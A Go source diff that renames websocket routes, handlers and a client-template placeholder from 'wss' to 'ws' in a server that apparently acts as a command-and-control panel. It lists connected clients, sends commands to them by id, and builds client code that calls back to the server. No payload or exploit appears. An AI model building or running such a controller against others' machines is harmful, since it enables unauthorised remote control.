@@ -290,7 +290,7 @@ func main() {
 		dialer := websocket.Dialer{
 			HandshakeTimeout: 10 * time.Second,
 		}
-		conn, _, err := dialer.Dial("WSS_ADMIN_REPLACE_ME", nil)
+		conn, _, err := dialer.Dial("WS_ADMIN_REPLACE_ME", nil)
 		if err != nil {
 			return nil, err
 		}
@@ -658,11 +658,11 @@ func main() {
 
 	r := mux.NewRouter()
 	r.HandleFunc("/login", loginHandler).Methods("POST")
-	r.Handle("/admin", authMiddleware(http.HandlerFunc(adminWSSHandler)))
+	r.Handle("/admin", authMiddleware(http.HandlerFunc(adminWSHandler)))
 	r.Handle("/clients", authMiddleware(http.HandlerFunc(getClientsHandler))).Methods("GET")
 	r.Handle("/send/{id}", authMiddleware(http.HandlerFunc(sendCommandHandler))).Methods("POST")
 	r.Handle("/apps/{file}", http.StripPrefix("/apps/", http.FileServer(http.Dir("./apps"))))
-	r.HandleFunc("/wss", wssHandler)
+	r.HandleFunc("/ws", wsHandler)
 	r.Handle("/profile", authMiddleware(http.HandlerFunc(profileHandler))).Methods("GET")
 	r.Handle("/upload_profile", authMiddleware(http.HandlerFunc(uploadProfileHandler))).Methods("POST")
 	r.HandleFunc("/default-profile.png", func(w http.ResponseWriter, r *http.Request) {
@@ -935,8 +935,8 @@ func createBuildHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	wssURL := fmt.Sprintf("wss://%s/wss?admin=%s", config.Host, username)
-	clientCode := strings.ReplaceAll(template, "WSS_ADMIN_REPLACE_ME", wssURL)
+	wsURL := fmt.Sprintf("wss://%s/ws?admin=%s", config.Host, username)
+	clientCode := strings.ReplaceAll(template, "WS_ADMIN_REPLACE_ME", wsURL)
 
 	if err := os.WriteFile(fullBuildPath, []byte(clientCode), 0644); err != nil {
 		w.WriteHeader(http.StatusInternalServerError)
@@ -1097,8 +1097,8 @@ func staticOrLogin(w http.ResponseWriter, r *http.Request) {
 	http.FileServer(http.Dir("./ui")).ServeHTTP(w, r)
 }
 
-func wssHandler(w http.ResponseWriter, r *http.Request) {
-	log.Println(">> wssHandler entered")
+func wsHandler(w http.ResponseWriter, r *http.Request) {
+	log.Println(">> wsHandler entered")
 	username := r.URL.Query().Get("admin")
 	if username == "" || users[username] == "" {
 		http.Error(w, "unauthorized", http.StatusUnauthorized)
@@ -1170,7 +1170,7 @@ func decodeBase64(s string) ([]byte, error) {
 	return io.ReadAll(base64.NewDecoder(base64.StdEncoding, strings.NewReader(s)))
 }
 
-func adminWSSHandler(w http.ResponseWriter, r *http.Request) {
+func adminWSHandler(w http.ResponseWriter, r *http.Request) {
 	username, ok := r.Context().Value("username").(string)
 	if !ok {
 		http.Error(w, "unauthorized", http.StatusUnauthorized)
